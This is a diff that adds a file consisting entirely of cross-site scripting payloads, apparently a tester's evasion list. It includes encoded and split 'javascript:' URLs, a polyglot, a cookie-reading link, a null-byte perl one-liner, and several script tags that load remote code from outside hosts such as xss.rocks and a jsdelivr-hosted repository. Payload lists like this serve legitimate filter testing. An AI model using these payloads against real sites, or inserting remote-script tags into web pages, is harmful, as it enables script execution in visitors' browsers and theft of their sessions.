@@ -1,0 +1,35 @@
+<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
+
+javascript:/*--></title></style></textarea></script></xmp> <svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
+
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
+
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
+
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+
+<IMG SRC="jav ascript:alert('XSS');">
+
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+
+<IMG SRC=" &#14; javascript:alert('XSS');">
+
+<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+
+<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
+
+<<SCRIPT>alert("XSS");//\<</SCRIPT>
+
+<IMG SRC="`<javascript:alert>`('XSS')"
+
+\";alert('XSS');//
+
+</script><script>alert('XSS');</script>
